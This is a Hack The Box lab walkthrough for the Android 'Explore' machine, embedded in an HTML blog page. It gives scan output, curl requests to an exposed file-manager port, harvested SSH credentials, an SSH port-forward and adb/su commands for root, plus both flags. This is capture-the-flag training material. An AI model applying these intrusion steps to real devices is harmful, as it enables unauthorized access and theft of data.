<!DOCTYPE html>
<html lang="en">
<title>Explore Walkthough..</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="index.css">
<head>
   <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
</head>

<style>
   body {font-family: "yu gothic"}
   .Slides {display: none}
</style>

<body>
<!-- Navigation bar -->
<div id='nav'>
<ul>
    <li><a href="index.html">Home</a></li>
    <li><a href="#about">About us</a></li>
    <li><a href="#contact">Join us</a></li>
    <li><a href="article selection.html">Articles</a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
    <li><a href="#spacer"></a></li>
<br><br>
    <pre class="ascii-art"><b>

-▄████▄---██▓-----█----██--▄▄▄▄-------██░-██-▓█████--██▓-----██▓-----██░-██--▒█████---██▓----▓█████-
▒██▀-▀█--▓██▒-----██--▓██▒▓█████▄----▓██░-██▒▓█---▀-▓██▒----▓██▒----▓██░-██▒▒██▒--██▒▓██▒----▓█---▀-
▒▓█----▄-▒██░----▓██--▒██░▒██▒-▄██---▒██▀▀██░▒███---▒██░----▒██░----▒██▀▀██░▒██░--██▒▒██░----▒███---
▒▓▓▄-▄██▒▒██░----▓▓█--░██░▒██░█▀-----░▓█-░██-▒▓█--▄-▒██░----▒██░----░▓█-░██-▒██---██░▒██░----▒▓█--▄-
▒-▓███▀-░░██████▒▒▒█████▓-░▓█--▀█▓---░▓█▒░██▓░▒████▒░██████▒░██████▒░▓█▒░██▓░-████▓▒░░██████▒░▒████▒
░-░▒-▒--░░-▒░▓--░░▒▓▒-▒-▒-░▒▓███▀▒----▒-░░▒░▒░░-▒░-░░-▒░▓--░░-▒░▓--░-▒-░░▒░▒░-▒░▒░▒░-░-▒░▓--░░░-▒░-░
--░--▒---░-░-▒--░░░▒░-░-░-▒░▒---░-----▒-░▒░-░-░-░--░░-░-▒--░░-░-▒--░-▒-░▒░-░--░-▒-▒░-░-░-▒--░-░-░--░
░----------░-░----░░░-░-░--░----░-----░--░░-░---░-----░-░-----░-░----░--░░-░░-░-░-▒----░-░------░---
░-░----------░--░---░------░----------░--░--░---░--░----░--░----░--░-░--░--░----░-░------░--░---░--░
░-------------------------------░-------------------------------------------------------------------

   </b></pre>
   </ul>
   </div>

<!-- image container -->
<div class="slideshow-container"> <!-- beginning of image container -->

<!-- Slideshow -->
<div class="Slides fade">
   <img src="explore.png" style="width:100%">
   <div class="text"><i>Hack the box Explore Machine Walkthough</i></div>
<br>
   <p class="caption_text"><del>Explore Walkthough</del></p>
</div>
</div> <!-- end of image container -->

<!-- Slideshow java script -->
<script>
var myIndex = 0;
carousel();

function carousel() {
var i;
var x = document.getElementsByClassName("Slides");
for (i = 0; i < x.length; i++) {
x[i].style.display = "none";  
}
myIndex++;
if (myIndex > x.length) {myIndex = 1}    
x[myIndex-1].style.display = "block";  
setTimeout(carousel, 4000);    
}
</script>

<br>

<!-- Writers info container -->
<div class="writers-container"> <!-- beginning of writers cotainer -->
<div class="row">
<div class="column">
   <p class="writers_names" style="font-size: 18px"><b><i>Virgo Foxxi</i></b></p>
</div>
<div class="column">
   <p class="writers_date" style="font-size: 18px"><i>22nd September 2021 // 10:38</i></p>
</div>
<div class="column">
   <img  class="box666" src="http://www.hackthebox.eu/badge/image/524661" alt="Hack The Box">
</div>
</div>
</div> <!-- end of writers container -->

<!-- breakup section -->
<div class="breakup-container"> <!-- beginning of breakup container -->
   <img src="news story breakup.jpg" alt="breakup" style="width:100%">
</div> <!-- end of breakup container -->

<!-- article section -->
<div class="article-container"> <!-- beginning of breakup container -->

<!-- space fore article -->
<pre class="article-text" style="font-size: 18px; font-family: "yu gothic"; float: left;">


▓█████-▒██---██▒-██▓███---██▓-----▒█████---██▀███--▓█████-
▓█---▀-▒▒-█-█-▒░▓██░--██▒▓██▒----▒██▒--██▒▓██-▒-██▒▓█---▀-
▒███---░░--█---░▓██░-██▓▒▒██░----▒██░--██▒▓██-░▄█-▒▒███---
▒▓█--▄--░-█-█-▒-▒██▄█▓▒-▒▒██░----▒██---██░▒██▀▀█▄--▒▓█--▄-
░▒████▒▒██▒-▒██▒▒██▒-░--░░██████▒░-████▓▒░░██▓-▒██▒░▒████▒
░░-▒░-░▒▒-░-░▓-░▒▓▒░-░--░░-▒░▓--░░-▒░▒░▒░-░-▒▓-░▒▓░░░-▒░-░
-░-░--░░░---░▒-░░▒-░-----░-░-▒--░--░-▒-▒░---░▒-░-▒░-░-░--░
---░----░----░--░░---------░-░---░-░-░-▒----░░---░----░---
---░--░-░----░---------------░--░----░-░-----░--------░--░
----------------------------------------------------------
HTB lab notes for explore
----------------------------------------------------------
my ip = 10.10.14.76
machine (explore) ip = 10.10.10.247
machine OS = android
----------------------------------------------------------
running an nmap scan on the system we see that 2 ports open:
 2222/tcp open     ssh     (protocol 2.0)
 | fingerprint-strings: 
 |   NULL: 
 |_    SSH-2.0-SSH Server - Banana Studio
 | ssh-hostkey: 
 |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
 5555/tcp filtered freeciv

we see that other than ssh there isnt much to go on, as such we run another 
scan using rustscan which shows us that there are 3 other ports open:
 42129/tcp ethernetIP-1 - http 
 42135/tcp http - file explorer
 59777/tcp http - bukkit JSONAPI - for minecraft game server
----------------------------------------------------------
checking all of the http ports, only 59777 has a message saying that there is 
no directory listing. as such i start looking around on google for an exploit.
after finding a POC on github that allows for the listing of device info.
downloading this and then running the commadn:

 python3 poc.py --cmd getDeviceInfo --ip 10.10.10.247

doing this we see that ftproot: /sdcard, this we assume is a directory on the 
device and as such we try to check this on our browser and we get the same, 
output.
as such i try running a curl command for the site:

 curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"ListFiles\"}" http://10.10.10.247:59777/  

doing this we get the same output from the site so i try this command with the 
/sdcard on the end of the curl command. and i get the output of 
 
 #html##body#Redirected: #a href="/sdcard/"#/sdcard/#/a##/body##/html#
----------------------------------------------------------
replace # with >< respectivily - agian sowwy the site ius a bit fussy about this still
----------------------------------------------------------
after running this i notice that the command ive been using had an error 
in the listFiles area and after correcting this and entering the command again
i get all of the files in the sdcard directory we see a file called user.txt
as such i enter this into my browser and we get the user flag / token:

 user token / flag: f32017174c7c7e8f50c6da52891ae250
----------------------------------------------------------
looking arounf the files alot more, we find one called DCIM which
after having a look on google as to what this is (since ive neer used android)
it is where the images are stored as such i take a look at that is within this
using the same curl command.
it shows us thre images:
 
 anc.png
 creds.jpg
 224_anc.png

of course the first one i look at in the browser is the creds.jpg.
this is an image of a note book with writing of creds, which im going to assume
is for ssh, these creds are:

<img src="creds.jpg" class="box666" style="width:50%">

 username = kristi
 password = Kr1sT!5h@Rp3xPl0r3!

after entering this into ssh we get an error saying that connection is
refused on port 22 (the normal port) as such after having a look around we 
find that most modern android devices with port 5555 enabled have port forwarding
support, as such after lookin gthough some of our tools this will be our method
of gaining root on the system.

as such we fist connect with ssh and forward the port with the command:

 sudo ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247

using this we gain access to kristi on the system, we will use adb 
(android debug bridge) to try and gain root on the system.
after setting up adb wit the command:

 adb localhost:5555

we will use the command of adb shell to access the shell we have just created
doing this we should gain access to the system and then we wil run the command
su to move to root on the system and then we can look for the root flag which we
find in /data:

 root flag / token = f04fc82b6d49b41c9b08982be59338c5
----------------------------------------------------------
</pre>
</div><!-- end of article container -->

<br>
<br>
<!-- Footer Section -->
<div class="footer_container" style="width:100%"> <!-- beginning of Footer container -->
   
</Div> <!-- end of footer container -->
   <div style="background-color: black;"></div>
   <img src="footer (3).png" style="width:100%">
</body>
</html>